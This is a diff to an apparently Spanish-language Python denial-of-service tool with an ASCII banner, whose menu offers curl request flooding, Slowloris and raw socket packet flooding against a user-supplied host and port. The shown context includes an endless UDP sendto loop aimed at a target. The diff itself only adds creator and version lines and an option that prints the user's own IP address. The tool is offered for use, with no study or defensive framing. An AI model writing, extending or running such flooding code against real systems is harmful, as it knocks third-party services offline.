@@ -3,6 +3,8 @@ import time
 from colorama import Fore
 import socket
 import random
+Creator=Fore.BLUE+"74lg0"
+Version=Fore.WHITE+"1.0"
 user_agents={
     
     "Opera/9.61.(X11; Linux x86_64; az-IN) Presto/2.9.190 Version/12.00"
@@ -25,7 +27,9 @@ print(Fore.BLUE+"███████║╚█████╗░░░░██
 print(Fore.BLUE+"██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║"+Fore.RED+" ██║╚████║██╔══╝░░░░░██║░░░")
 print(Fore.BLUE+"██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝"+Fore.RED+" ██║░╚███║███████╗░░░██║░░░")
 print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
-method=int(input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket\n~~~~> "))
+print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+method=int(input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Ver mi IP\n~~~~> "))
 if method == 1:
     host=input("Ingresa el IP, Host\n~~~~> ")
     treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
@@ -90,3 +94,10 @@ if method == 3:
         print(Fore.WHITE+"Enviando paquetes a "+Fore.YELLOW+ip+Fore.WHITE+" a travez del puerto: "+Fore.BLUE+port)
         while True:
             sock.sendto(bytes, (ip,int(port)))
+            
+            
+            
+if method == 4:
+    print("Tu direccion IP es:")
+    time.sleep(2)
+    system("curl ifconfig.me")
